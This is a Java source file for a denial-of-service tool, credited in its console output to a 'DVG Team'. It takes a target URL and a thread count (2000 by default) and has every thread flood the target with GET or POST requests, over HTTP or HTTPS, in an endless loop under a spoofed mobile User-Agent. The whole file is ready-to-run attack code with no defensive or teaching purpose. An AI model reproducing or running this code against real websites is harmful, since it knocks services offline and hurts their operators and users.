import java.io.*;
import java.net.*;
import java.util.Scanner;
import java.util.ArrayList;

import javax.net.ssl.HttpsURLConnection;


public class Dos implements Runnable {



    private final String USER_AGENT ="Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H143 Safari/600.1.4";

    private static int amount = 0;
    private static String url = "";
    int seq;
    int type;

    public Dos(int seq, int type) {
        this.seq = seq;
        this.type = type;
    }

    public void run() {
        try {
            while (true) {
                switch (this.type) {
                    case 1:
                        postAttack(Dos.url);
                        break;
                    case 2:
                        sslPostAttack(Dos.url);
                        break;
                    case 3:
                        getAttack(Dos.url);
                        break;
                    case 4:
                        sslGetAttack(Dos.url);
                        break;

                }
            }
        } catch (Exception e) {

        }
    }


    public static void main(String[] args) throws Exception {
        String url = "";
        int attakingAmoun = 0;
        Dos dos = new Dos(0, 0);
        Scanner in = new Scanner(System.in);
        System.out.print("Enter Url: ");
        url = in.nextLine();

        String[] SUrl = url.split("://");

        System.out.println("Kiem tra ket noi toi website");
        if (SUrl[0] == "http" || SUrl[0].equals("http")) {
            dos.checkConnection(url);
        } else {
            dos.sslCheckConnection(url);
        }

        System.out.println("DDoS by DVG Team");

        System.out.print("Thread: ");
        String amount = in.nextLine();

        if (amount == null || amount.equals(null) || amount.equals("")) {
            Dos.amount = 2000;
        } else {
            Dos.amount = Integer.parseInt(amount);
        }

        System.out.print("Method: ");
        String option = in.nextLine();
        int ioption = 1;
        if (option == "get" || option == "GET") {
            if (SUrl[0] == "http" || SUrl[0].equals("http")) {
                ioption = 3;
            } else {
                ioption = 4;
            }
        } else {
            if (SUrl[0] == "http" || SUrl[0].equals("http")) {
                ioption = 1;
            } else {
                ioption = 2;
            }
        }

        Thread.sleep(2000);


        System.out.println("DDoS Raid");
        ArrayList<Thread> threads = new ArrayList<Thread>();
        for (int i = 0; i < Dos.amount; i++) {
            Thread t = new Thread(new Dos(i, ioption));
            t.start();
            threads.add(t);
        }

        for (int i = 0; i < threads.size(); i++) {
            Thread t = threads.get(i);
            try {
                t.join();
            } catch (Exception e) {

            }
        }
        System.out.println("Thread Ended");
    }

    private void checkConnection(String url) throws Exception {
        System.out.println("Kiem tra ket noi");
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
        if (responseCode == 200) {
            System.out.println("Ket noi toi website thanh cong");
        }
        Dos.url = url;
    }

    private void sslCheckConnection(String url) throws Exception {
        System.out.println("Checking chung chi website (ssl)");
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
        if (responseCode == 200) {
            System.out.println("Ket noi toi website thanh cong");
        }
        Dos.url = url;
    }

    private void postAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        con.setRequestProperty("User-Agent", USER_AGENT);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";

        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
    }

    private void getAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
    }

    private void sslPostAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";

        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
    }

    private void sslGetAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
    }
}